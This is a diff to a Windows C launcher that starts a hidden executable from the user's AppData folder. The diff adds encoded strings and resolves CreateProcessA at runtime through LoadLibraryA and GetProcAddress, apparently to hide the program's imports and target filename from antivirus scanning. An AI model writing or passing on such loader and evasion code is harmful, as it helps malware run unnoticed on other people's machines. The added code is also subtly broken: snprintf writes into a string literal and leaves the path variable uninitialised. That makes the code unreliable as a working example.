@@ -2,9 +2,37 @@
 #include <shlobj.h>
 #include <stdbool.h>
 #include <stdio.h>
+#include "enc.h"
+
+typedef BOOL (WINAPI *LPCTRPRC)(
+    LPCSTR                lpApplicationName,
+    LPSTR                 lpCommandLine,
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    BOOL                  bInheritHandles,
+    DWORD                 dwCreationFlags,
+    LPVOID                lpEnvironment,
+    LPCSTR                lpCurrentDirectory,
+    LPSTARTUPINFOA        lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation
+);
+
 
 void crtProc(LPSTR szPath, STARTUPINFO si, PROCESS_INFORMATION pi){
-    bool r = CreateProcessA(NULL,
+
+    LPCTRPRC crtprc = NULL;
+    // decode encoded lib name 
+    char* kr32dec = Decode("ICYjLC0ncGNsLCcv");
+    char* crtprocN = Decode("DCYlEjokIBAmLDkmIjEA");
+    // LoadLibrary
+    HMODULE kn32 = LoadLibraryA(kr32dec);
+    // Get Function Adress(CreateProcessA)
+    crtprc = (LPCTRPRC) GetProcAddress(kn32, crtprocN);
+
+
+    // Run that function
+    
+    bool r = crtprc(NULL,
     szPath,
     NULL,
     NULL,
@@ -24,7 +52,7 @@ int main() {
     
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
-
+    char* exPath;
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
@@ -33,8 +61,13 @@ int main() {
     ZeroMemory(&pi, sizeof(pi));
 
     TCHAR szPath[MAX_PATH];
-    char* exPath = "\\run.exe";
+    char* exPTDEC = Decode("OTY/bC0zJgAA");
+    
+    snprintf("exPath", sizeof(exPath),"\\%s", exPTDEC);
 
+    // LoadLibrary
+    // Get Function Adress (SHGetFolderPath)
+    // Run that function
     if(SUCCEEDED(SHGetFolderPath(NULL, 
         CSIDL_LOCAL_APPDATA, 
         NULL, 
